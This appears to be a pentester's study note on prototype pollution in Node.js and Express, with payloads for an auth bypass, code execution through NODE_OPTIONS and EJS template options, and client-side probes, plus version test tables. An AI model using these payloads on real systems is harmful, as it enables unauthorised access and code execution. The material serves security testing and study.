**Prototype pollution** — in JavaScript almost every object inherits from `Object.prototype`, so a property written there appears on every object that does not define it itself. Mechanically: you find code that copies attacker-controlled keys into an object recursively, send a key named `__proto__` so the copy walks up into the prototype, and plant a property that some other code later reads as a default: an `isAdmin` flag, an option of `child_process`, a template engine setting. The first is an auth bypass, the last two are code execution.

```
you -> app: POST /prefs  {"__proto__":{"isAdmin":true}}
app:        merge(prefs, body)  -> writes Object.prototype.isAdmin
later:      if (user.isAdmin)   -> true for every user object
later:      fork('./worker.js') -> child inherits your NODE_OPTIONS -> your code runs
```

Tested on Node 20.20 and 22.23 with Express 4.22.3, unless a line says otherwise.

## How it works

The bug is a recursive merge, clone or "set by path" that does not skip special keys:

```javascript
function merge(dst, src) {
  for (const k in src) {
    if (src[k] && typeof src[k] === 'object') {
      if (typeof dst[k] !== 'object' || dst[k] === null) dst[k] = {};
      merge(dst[k], src[k]);              // k = "__proto__": dst[k] is Object.prototype
    } else dst[k] = src[k];
  }
  return dst;
}
```

What does and does not pollute:

| Input path | Result |
|---|---|
| `JSON.parse('{"__proto__":{…}}')` then a recursive merge | pollutes |
| `{"constructor":{"prototype":{…}}}` | pollutes only if the merge recurses into existing functions; the merge above does not, a lodash-style one does |
| `JSON.parse` by itself | no: `__proto__` becomes an ordinary own key |
| `Object.assign`, spread, an object literal | no |
| `express.json()` | keeps `__proto__` as an own key, ready for a later merge |
| Query string or form body through `qs` 6.17 | no: `__proto__` and `constructor` keys are dropped |

So on a current Express stack the way in is a JSON body.

Objects created with `Object.create(null)` and `Map` are immune, and so is any read guarded by `Object.hasOwn`.

## Discovery

White-box. Find the copy, then find what reads a missing property:

```bash
grep -rnE 'merge|extend|assign|clone|defaults|deepCopy|setPath|set\(' --include='*.js' . | grep -v node_modules
grep -rnE '\[[a-zA-Z_.]+\]\s*=' --include='*.js' . | grep -v node_modules        # obj[key] = value
grep -rnE 'child_process|fork\(|spawn\(|exec(Sync|File)?\(' --include='*.js' . | grep -v node_modules
grep -rnE '"(lodash|ejs|pug|handlebars|minimist|qs)"' package.json package-lock.json
```

Confirm in the debugger (`node --inspect`, see [[whitebox_cheatsheet]]): send the payload, then evaluate `({}).polluted` in the console.

Library versions matter:

| Library | Tested |
|---|---|
| lodash 4.17.11 | `merge` is safe; `defaultsDeep` via `constructor.prototype`, `set` and `setWith` pollute |
| lodash 4.17.21 | none of them pollute |

Black-box, two signals that need no source:

```json
{"__proto__":{"status":510}}
```

After this, any error the app raises without its own status code comes back as **510** instead of 500. Malformed-JSON errors keep their 400, so trigger an error inside a route.

```json
{"__proto__":{"json spaces":10}}
```

Documented to make every JSON response indented on older Express. It did nothing on 4.22.3.

## Exploitation

### Method 1: flip a flag

Any check on a property that normal objects do not carry:

```json
{"__proto__":{"isAdmin":true}}
```

```javascript
const user = {name: 'guest'};
if (user.isAdmin) { /* now true */ }
```

Look for `role`, `admin`, `verified`, `allowed`, and for options with unsafe non-defaults (`debug`, `allowHtml`, `skipAuth`).

### Method 2: `NODE_OPTIONS` into a child process

When Node starts a child it copies the environment with a loop that also sees inherited keys, so a polluted `NODE_OPTIONS` becomes a real environment variable of the child. If the child is Node, it runs your code at startup.

```json
{"__proto__":{"NODE_OPTIONS":"--import \"data:text/javascript,import('node:child_process').then(c=>c.execSync('id > /tmp/proof'))\""}}
```

With a file you can write (upload, log, temp file) the older form works too:

```json
{"__proto__":{"NODE_OPTIONS":"--require /tmp/x.js"}}
```

| Trigger in the app | Result |
|---|---|
| `fork('./worker.js')` | RCE |
| `spawn('node', […])`, `spawnSync`, `execFile('node', […])` | RCE |
| `exec('node script.js')`, `execSync` | RCE |
| any of the above with an explicit `env: {…}` object | RCE (the loop still sees inherited keys) |
| `execSync('ls')` or any child that is not Node | nothing |

Send the pollution, then request the route that starts the child. Polluting `shell`, `env` or `execArgv` did not work on Node 20: the options object is copied without its prototype.

### Method 3: template engine options

| Engine | Tested | Result |
|---|---|---|
| EJS 3.1.6 | `outputFunctionName`, and `client` + `escapeFunction` | RCE on the next render |
| EJS 3.1.9, 3.1.10 | same payloads | nothing |
| Pug 3.0.4 | `block` AST injection | nothing; documented for older Pug |

EJS 3.1.6:

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id > /tmp/proof');s"}}
```

```json
{"__proto__":{"client":1,"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').execSync('id > /tmp/proof')"}}
```

Handlebars and older Pug have AST-injection gadgets of the same kind. Not tested here; see the references.

### Method 4: the app's own gadgets

In a white-box test the best gadget is usually in the application: an options object passed to `exec`, a path joined from `config.dir`, a `require(opts.plugin)`. Search for reads of properties that are never assigned, then pollute exactly that name.

### Client-side

Same bug in the browser, where the result is DOM XSS. Not tested for this note.

```
https://victim.example/?__proto__[polluted]=1
https://victim.example/#__proto__[polluted]=1
https://victim.example/?constructor[prototype][polluted]=1
```

Check `Object.prototype.polluted` in the console. Then you need a script on the page that reads an unset option into a sink (`innerHTML`, a script `src`, a jQuery selector). Burp's DOM Invader finds both halves.

## Caution

- **Pollution is global and lasts until the process restarts.** Every user is affected. A wrong key (`toString`, `then`, `length`, `constructor`) takes the whole app down, and on an exam box that is a revert.
- **Use a unique property name for probing**, never a real one.
- **You often cannot undo it.** `{"__proto__":{"x":null}}` overwrites the value but does not delete the key.
- **Gadgets are version-specific.** The table rows above are what ran on those exact versions; check the target's `package-lock.json` and test locally with the same versions before you fire.
- **`process.mainModule` exists only in CommonJS.** In an ES-module app use `--import` with a `data:` URL as in Method 2.

## References

- PortSwigger - Server-side prototype pollution - https://portswigger.net/web-security/prototype-pollution/server-side
- PortSwigger Research - Server-side prototype pollution: black-box detection without the DoS - https://portswigger.net/research/server-side-prototype-pollution
- Silent Spring: Prototype Pollution Leads to RCE in Node.js (USENIX Security 2023) - https://github.com/yuske/silent-spring
- HackTricks - Prototype pollution to RCE - https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html
- PayloadsAllTheThings - Prototype pollution - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
